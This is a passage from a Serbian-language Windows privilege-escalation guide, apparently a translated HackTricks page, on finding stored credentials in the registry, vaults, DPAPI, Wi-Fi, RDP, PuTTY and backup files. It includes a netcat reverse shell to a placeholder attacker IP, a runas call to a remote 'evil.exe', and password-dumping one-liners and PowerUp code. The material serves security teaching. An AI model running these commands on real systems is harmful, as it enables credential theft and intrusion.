[**Pogledajte ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(izlistavanje pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni fajl `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete osluškivati na bilo kom portu (kada prvi put upotrebite `nc.exe` za osluškivanje na portu, GUI će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite WSL sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windowsu. Ako trenutni Windows identitet može da čita sistem datoteka distribucije, pregledajte datoteke istorije shell-a (uključujući `/root/.bash_history`) i potražite komande koje su možda zabeležile kredencijale; eskalacija i dalje zahteva važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` važi za starije WSL instalacije; WSL 2 obično čuva distribuciju na [`ext4.vhdx` virtuelnom disku](https://learn.microsoft.com/en-us/windows/wsl/disk-space), pa prvo utvrdite stvarnu distribuciju i putanju za skladištenje. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog prikupljanja podataka.

## Windows kredencijali

### Winlogon kredencijali

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao kredencijale. Vrednost `DefaultPassword` ili `AltDefaultPassword` koja nije prazna predstavlja nalaz plaintext lozinke u registru. Ako je `AutoAdminLogon=1`, ali nijedna plaintext lozinka nije čitljiva, to je samo trag: [Sysinternals Autologon može da čuva lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a obično čitanje registra ne potvrđuje da li taj secret postoji niti da li se može preuzeti. Pre nego što prijavite izlaganje kredencijala, proverite prava pristupa i stvarnu konfiguraciju prijavljivanja.

### Credential Manager / Windows Vault

Sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke kredencijale za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled može delovati kao da korisnici mogu da čuvaju kredencijale za sajtove kao što su Facebook, Twitter ili Gmail i da se automatski prijavljuju preko pregledača, ali to nije način na koji funkcioniše.

Windows Vault čuva kredencijale pomoću kojih Windows može automatski da prijavi korisnike. To znači da svaka **Windows aplikacija kojoj su potrebni kredencijali za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da upotrebi dostavljene kredencijale umesto da korisnici svaki put unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste kredencijale za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa Credential Manager-om i zatraži kredencijale za taj resurs** iz podrazumevanog skladišta vault-a.

Koristite `cmdkey` da biste izlistali sačuvane kredencijale na mašini.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete da koristite `runas` sa opcijom `/savecred` da biste upotrebili sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl preko SMB deljenog direktorijuma.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` uz zadate akreditive.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Napomena: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modul [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Savremene Windows UWP aplikacije, Microsoft Edge i savremeni sistemski servisi čuvaju tokene za autentifikaciju i plaintext lozinke unutar UWP `PasswordVault` (dostupan i kao `Web Credentials` u `vaultcmd`). Ovaj prostor za skladištenje izolovan je po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu u aktivnoj sesiji korisnika da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i plaintext lozinke:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, koji se pretežno koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi tajnu korisnika ili sistema kao značajan doprinos entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavljivanje**. U slučajevima kada se koristi sistemsko šifrovanje, upotrebljavaju se tajne za autentifikaciju sistema u domenu.

Šifrovani korisnički RSA ključevi, zaštićeni pomoću DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi zajedno sa glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa se njegov sadržaj ne može izlistati pomoću komande `dir` u CMD-u, ali može pomoću PowerShell-a.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete da koristite **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da biste dešifrovali.\
Možete da **izvučete mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i automatizaciju, kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju `.xml`. Kada skripta ili inventar datoteka ukazuje na takvu datoteku, pronađite stvarni direktorijum profila naloga umesto da pretpostavite da se nalazi u `C:\Users`: [Windows može da smesti profile na druga mesta](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka je samo trag; [Windows `Export-Clixml` povezuje šifrovan akreditiv sa korisnikom koji ga je izvezao i računarom na kojem je to učinjeno](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki pronađeni nalog mora zasebno da ima važeća ovlašćenja za predviđeni servis. Najpre pregledajte putanje i ACL-ove, bez ispisivanja šifrovanih ili otvorenih vrednosti tokom rutinskog popisivanja.

Da biste **dešifrovali** PowerShell akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač akreditivima za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite Mimikatz `dpapi::rdg` modul sa odgovarajućim `/masterkey` da biste dešifrovali sve .rdg fajlove\
Možete **izvući mnoge DPAPI masterkeys** iz memorije pomoću Mimikatz `sekurlsa::dpapi` modula

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljiv XML u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući fajlove sa uobičajenim nazivima poput `config.xml`. Utvrdite šemu veza i šifrovane `Password` atribute pre nego što XML fajl smatrate mogućim izvorom akreditiva. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od podešavanja šifrovanja fajla i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opšte enumeracije.

**Remote Desktop Plus profili za izvoz** takođe mogu biti čitljivi u korisničkim fasciklama ili deljenoj administrativnoj fascikli. Izvezeni nasleđeni `profiles.xml` sadrži `Data/Profile` unose sa elementima `ProfileName`, `Password` i `Secure`. Neprazan element lozinke tretirajte kao mogući izvor akreditiva; nemojte ga ispisivati niti pretpostavljati da sadrži običan tekst: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili podešena manje strogo. Proverite poreklo fajla i uslove oporavka pre nego što se oslonite na njega.

### Sticky Notes

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške u `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili drugačije aplikacije mogu koristiti druga skladišta korisničkog profila, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladišta koristi pre nego što odsustvo SQLite fajla protumačite kao odsustvo beleški.

Ako Sticky Notes koristi SQLite write-ahead logging, kopija samo fajla `plum.sqlite` može izostaviti nedavno potvrđene beleške. Sa doslednom kopijom baze podataka sačuvajte i odgovarajući `plum.sqlite-wal`, a uključite i `plum.sqlite-shm` kada je dostupan; indeks deljene memorije može se ponovo izgraditi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite dokumentaciju za WAL](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je mogući izvor akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Šifrovan zapis iz password manager-a zahteva i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi mogao da potvrdi prijavu sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga na nivou High Integrity.**\
**AppCmd.exe** se nalazi u fascikli `%systemroot%\system32\inetsrv\`.\
Ako ovaj fajl postoji, moguće je da su neke **akreditacije** konfigurisane i da ih je moguće **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li postoji `C:\Windows\CCM\SCClient.exe`.\
**Instalacioni programi se pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Fajlovi i Registry (kredencijali)

### Artefakti kredencijala u Registry-ju alata za podršku

Neke starije instalacije za udaljenu podršku zadržavaju nazive vrednosti povezane s lozinkama pod fiksnim ključevima aplikacije u Registry-ju. Na primer, prema [objašnjenju proizvođača o Registry ključu](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` u verzijama TeamViewer-a pre verzije 9 označavao je konfigurisanu statičku lozinku sesije. Oznaka u nazivu vrednosti samo je trag za proveru: pre procene tog kredencijala proverite instaliranu verziju, dostupnost podataka vrednosti za čitanje, format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke i ovlašćenje za taj nalog. Šifrovani tekst i otkrivene lozinke ne uključujte u rutinski izlaz enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da deljena radna sveska čitljiva za vas sadrži podatke o nalozima, razlikujte **šifrovanje fajla** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista ograničava uređivanje i nije bezbednosna funkcija; sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene, relevantne fajlove i izbegavajte ispisivanje mogućih tajni tokom široke enumeracije. Putanja do čitljivog `.xlsx` fajla, zaštićeni list ili skrivena kolona sami po sebi ne dokazuju da postoje kredencijali niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Sačuvane zakrpe izmena na CI serveru

CI server može zadržati poslate izmene izvornog koda u direktorijumu sa podacima i nakon završetka build-a. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) da se `system/changes` koristi za čuvanje izmena iz udaljenih pokretanja; direktorijum sa podacima može biti konfigurisan i ne mora se nalaziti pod `ProgramData`. Čitljiva zakrpa može sačuvati uklonjene ili dodate reference na fajl sa kredencijalima, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell radni tok `ConvertTo-SecureString -Key` zahteva AES ključ, kao i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim uz ovlašćenje proverite relevantan sadržaj, bez ispisivanja tajni u rutinskom izlazu enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju postojanje važećeg kredencijala niti pristup sa višim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene build-a.

### Prilagođena rotacija lozinke lokalnog administratora

Samostalno napravljeno rešenje za rotaciju lozinki može čuvati šifrovanu lozinku lokalnog administratora u lokalnom servisu, dok su kredencijali za skladište podataka u čitljivom `.env` fajlu ili pored binarne datoteke ažuratora. Zajedno proverite zakazani zadatak ažuratora, nalog, ACL-ove konfiguracije, listener i dozvole skladišta podataka. Lokalni datastore dostupan samo preko loopback-a i dalje je dostupan lokalnom korisniku koji ima važeće kredencijale, ali sama autentifikacija ne dokazuje da korisnik ima dozvolu za čitanje relevantnih zapisa. Ako su seed za šifrovanje ili materijal ključa dostupni pored šifrata, pre oslanjanja na šifrovanje proverite tačan način izvođenja ključa. Šema koja deterministički izvodi AES ključ iz izloženog seed-a pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije prikladna za zaštitu te lozinke; Go navodi da taj paket nije primeren za slučajeve u kojima je bezbedna slučajnost važna. Pre nego što bilo koju otkrivenu lozinku tretirate kao putanju za eskalaciju, potvrdite da je aktuelna i da pripada nalogu koji je član lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` fajla ili šifrovani blob sami po sebi ne dokazuju nijedan od tih uslova. Lozinke i materijal ključa ne uključujte u rutinski izlaz enumeracije.

Za upravljanje lozinkama lokalnih administratora koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Njegovo skladištenje u direktorijumu ili u Entra okruženju i pripadajuće kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [uloge u Elasticsearch-u](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba kredencijala

Neki dodaci za Java servere distribuiraju se kao JAR arhive u direktorijumu servera `plugins`. Čitljiv prilagođeni dodatak može sadržati konfiguraciju ili bytecode sa ugrađenim servisnim kredencijalom. Arhivu pregledajte samo uz ovlašćenje, a otkrivene tajne ne uključujte u rutinski izlaz enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a otkrivena servisna lozinka vodi do viših privilegija samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove fajlova i zamenite ponovo upotrebljene kredencijale zasebnim tajnama. Pogledajte [PaperMC vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [Oracle JAR dokumentaciju](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhiva.

### Kredencijali ugrađene Openfire baze podataka

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može čuvati `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da ga čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire [dokumentacija o provajderu korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu biti sačuvane u običnom tekstu ili šifrovane ključem koji se čuva u tom svojstvu. Otkrivena lozinka važna je za eskalaciju samo ako još važi za identitet sa višim privilegijama; samo ime fajla ne dokazuje ni pristup za čitanje ni ponovnu upotrebu kredencijala. Putanja je samo smernica za inventarizaciju, zato sadržaj baze podataka i kredencijale ne uključujte u rutinski izlaz enumeracije.

Zaseban fajl `Openfire\conf\openfire.xml` može da otkrije konfigurisane portove i bind interfejs administratorske konzole čak i kada se koristi spoljna baza podataka. Openfire obično veže administratorsku konzolu za loopback; lokalni nalog i dalje može da pristupi toj adresi ako listener radi. Zajedno proverite stvarni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire servisa. Administrator koji može da instalira dodatak može da pokrene njegov kod u kontekstu servisa, što može imati visoke privilegije ako se servis pokreće kao LocalSystem. Poklapanje lozinke naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte proizvođačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

Konfiguracije servera Velociraptor, koje se obično zovu `server.config.yaml`, mogu sadržati `CA.private_key` internog CA-a. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda može da izda API klijentski sertifikat. Da li to vodi do viših privilegija zavisi od korisničkih uloga servera, dostupnosti API-ja i identiteta pod kojim se izvršavaju server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne potvrđuje pristup CA-u servera. U nekim implementacijama privatni ključ CA-a čuva se van mreže, pa čitljiva konfiguracija servera možda ne sadrži ključ za potpisivanje.

Na Windows serveru proverite ACL konfiguracije **servera** u njegovom instalacionom direktorijumu, kao i svih zaštićenih rezervnih kopija. Jedna moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se razlikuje, koristite putanju koju je konfigurisao servis. Potvrdite da trenutni identitet može da čita fajl i да је `CA.private_key` заиста присутан. Избегавајте исписивање приватног кључа у евиденцијама или излазу енумерације. Произвођачев радни ток `config api_client` користи кључ CA-а за издавање клијентског сертификата, али је потребна и ефикасна улога на страни сервера; њено креирање или мењање може захтевати приступ за писање у datastore или поновно покретање. Постојећи привилеговани идентитет сервера може да омогући приступ и када такво писање није доступно. API упити са правима за извршавање покрећу се у одговарајућем контексту сервера или агента, који може имати високе привилегије.

Заштитите конфигурацију сервера и резервне копије рестриктивним ACL-овима, држите кључ за потписивање CA-а ван мреже кад год је то могуће и ограничите API улоге и приступ listener-у. Погледајте [Velociraptor API документацију](https://docs.velociraptor.app/docs/server_automation/server_api/) и [смернице за безбедносну конфигурацију](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY kredencijali

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban menadžer sesija. Njegovo izvorno šifrovano skladište može se nalaziti na `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može biti nazvana `sessions-backup.dat` i smeštena na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i da mogu sadržati sesije, ključeve, skripte, oznake i veze; njegov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi gde se nalazi izvorno skladište. Najpre proverite dozvole nad datotekama i putanje. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani kredencijali i dalje važeći ili da omogućavaju veće privilegije.

### PuTTY SSH host ključevi

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos u toj putanji, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovan, ali se lako može dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta, a želite da se automatski pokreće pri pokretanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu putem ssh-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije zabeležio korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za instalaciju bez nadzora

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) rezervne kopije mogu da sadrže i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Dajte prednost lokalno dostupnim direktorijumima rezervnih kopija ili image datotekama i proverite **nazive članova** image datoteke pre izdvajanja bilo čega; samo ime `.wim` datoteke ne dokazuje da su hive-ovi izloženi, a uobičajene `install.wim`, `boot.wim` i recovery image datoteke često navode na pogrešan trag. SMB deljeni resurs predstavlja zaseban način pristupa i treba ga proveravati samo ako je taj resurs u obuhvatu. Pogledajte Microsoft-ove smernice za [Windows image datoteke](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za datoteke registry hive-ova](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Akreditivi za cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
